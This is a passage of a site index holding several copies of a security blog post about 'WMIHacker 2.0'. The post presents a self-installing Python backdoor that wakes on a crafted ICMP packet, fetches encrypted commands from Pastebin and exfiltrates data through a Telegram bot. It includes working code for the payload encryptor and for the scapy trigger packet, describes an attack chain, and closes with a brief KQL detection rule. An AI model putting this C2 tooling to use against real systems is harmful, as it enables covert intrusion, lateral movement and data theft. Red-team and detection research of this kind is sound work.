","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nVICTIM HOST:\npython wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nVICTIM HOST:\npython wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nwmihacker.exe The attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nVICTIM HOST:\npython wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nwmihacker.exe \u0026lt;LOCAL_IP\u0026gt; The attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates 